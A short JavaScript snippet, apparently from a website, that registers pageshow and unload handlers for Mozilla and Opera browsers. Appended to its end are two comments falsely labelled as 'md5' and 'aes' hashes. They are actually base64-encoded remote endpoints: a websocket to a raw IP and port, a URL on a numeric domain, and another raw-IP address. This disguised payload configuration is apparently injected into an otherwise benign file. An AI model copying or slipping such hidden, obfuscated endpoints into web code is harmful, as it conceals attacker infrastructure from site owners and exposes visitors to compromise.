if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:d3M6Ly81NC4yNTEuMjM0LjIyMTozMDA4LGh0dHBzOi8vd3d3Ljg0MDExMDExMTMuY29tL2luZGV4L2luZGV4L2hlbGxvLmh0bWwsaW1n**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/